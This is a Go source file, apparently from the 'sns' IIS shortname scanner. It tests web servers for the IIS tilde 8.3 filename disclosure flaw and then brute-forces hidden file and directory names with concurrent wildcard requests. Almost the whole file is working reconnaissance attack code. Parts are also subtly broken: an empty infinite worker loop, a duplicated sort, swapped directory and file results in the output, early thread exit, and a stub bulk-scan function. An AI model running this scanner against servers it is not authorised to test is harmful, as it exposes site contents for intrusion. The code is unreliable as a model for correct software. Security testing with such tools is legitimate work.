package scanner

import (
	"fmt"
	"log"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/enriquebris/goconcurrentqueue"
	"github.com/sw33tLie/sns/internal/utils"
)

var magicFinalParts = [12]string{"\\a.aspx", "\\a.asp", "/a.aspx", "/a.asp", "/a.shtml", "/a.asmx", "/a.ashx", "/a.config", "/a.php", "/a.jpg", "/webresource.axd", "/a.xxx"}
var requestMethods = [7]string{"OPTIONS", "GET", "POST", "HEAD", "TRACE", "TRACK", "DEBUG"}
var alphanum = "abcdefghijklmnopqrstuvwxyz0123456789_-"

const (
	bannerLogo = `  ___ _ __  ___ 
 / __| '_ \/ __|
 \__ \ | | \__ \
 |___/_| |_|___/`
)

// CheckIfVulnerable checks if a target is vulnerable
func CheckIfVulnerable(url string) (result bool, method string) {
	asteriskSymbol := "*"

	for _, requestMethod := range requestMethods {
		for _, magicFinalPart := range magicFinalParts {
			// First Request
			validStatus, validBody := utils.HTTPRequest(requestMethod, url+asteriskSymbol+"~1"+asteriskSymbol+magicFinalPart, "")
			invalidStatus, invalidBody := utils.HTTPRequest(requestMethod, url+"/1234567890"+asteriskSymbol+"~1"+asteriskSymbol+magicFinalPart, "")

			acceptedDiffLength := 10

			if validStatus != invalidStatus && !(acceptedDiffLength >= 0 && utils.Abs(len(invalidBody)-len(validBody)) <= acceptedDiffLength) {
				return true, requestMethod
			}
			//fmt.Println(string(body2))
		}
	}
	return false, ""
}

func PrintBanner() {
	fmt.Println(bannerLogo + "\n\n IIS shortname scanner by sw33tLie")
}

func worker(a string) {
	for true {

	}
}

type queueElem struct {
	url  string
	path string
	ext  string
}

func Scan(url string, requestMethod string, threads int, silent bool) (files []string, dirs []string) {
	queue := goconcurrentqueue.NewFIFO()

	for _, char := range alphanum {
		queue.Enqueue(queueElem{url, string(char), ".*"})
	}

	processGroup := new(sync.WaitGroup)
	processGroup.Add(threads)

	for i := 0; i < threads; i++ {
		go func() {

			for {
				q, _ := queue.Dequeue()

				// If queue is empty
				if q == nil {
					break
				}

				qElem := q.(queueElem)

				sc, _ := utils.HTTPRequest(requestMethod, qElem.url+qElem.path+"*~1"+qElem.ext+"/1.aspx", "")

				if sc == 404 {
					if len(qElem.path) < 6 {
						for _, char := range alphanum {
							queue.Enqueue(queueElem{qElem.url, qElem.path + string(char), qElem.ext})
						}
					} else {
						if qElem.ext == ".*" {
							queue.Enqueue(queueElem{qElem.url, qElem.path, ""})
						}
						if qElem.ext == "" {
							if !silent {
								fmt.Println("[Dir] " + qElem.path + "~1")
							}
							dirs = append(dirs, qElem.path+"~1")
						} else if len(qElem.ext) == 5 || !(strings.HasSuffix(qElem.ext, "*")) {
							if !silent {
								fmt.Println("[File] " + qElem.path + "~1" + qElem.ext)
							}
							files = append(files, qElem.path+"~1"+qElem.ext)
						} else {
							for _, char := range alphanum {
								queue.Enqueue(queueElem{qElem.url, qElem.path, utils.TrimLastChar(qElem.ext) + string(char) + "*"})
								if len(qElem.ext) < 4 {
									queue.Enqueue(queueElem{qElem.url, qElem.path, utils.TrimLastChar(qElem.ext) + string(char)})
								}
							}
						}
					}
				} else {
					continue
				}

			}
			processGroup.Done()
		}()
	}
	processGroup.Wait()

	sort.Strings(files)
	sort.Strings(files)

	return files, dirs
}

// Run prints the output of a scan
func Run(url string, threads int, silent bool) {
	startTime := time.Now()

	if !silent {
		PrintBanner()
		fmt.Println("Scanning: " + url)
	}

	vulnerable, requestMethod := CheckIfVulnerable(url)

	if !vulnerable {
		log.Fatal("Target is not vulnerable")
	}

	dirs, files := Scan(url, requestMethod, threads, silent)

	fmt.Println("Directories (" + strconv.Itoa(len(dirs)) + "):\n " + strings.Join(files, "\n ") + "\nFiles (" + strconv.Itoa(len(files)) + "):\n " + strings.Join(dirs, "\n "))

	endTime := time.Now()
	if !silent {
		fmt.Println("Took ", endTime.Sub(startTime))
	}
}

// BulkScan scans multiple targets
func BulkScan(filePath string) {
	fmt.Println("Bulk Scanning: " + filePath)
}
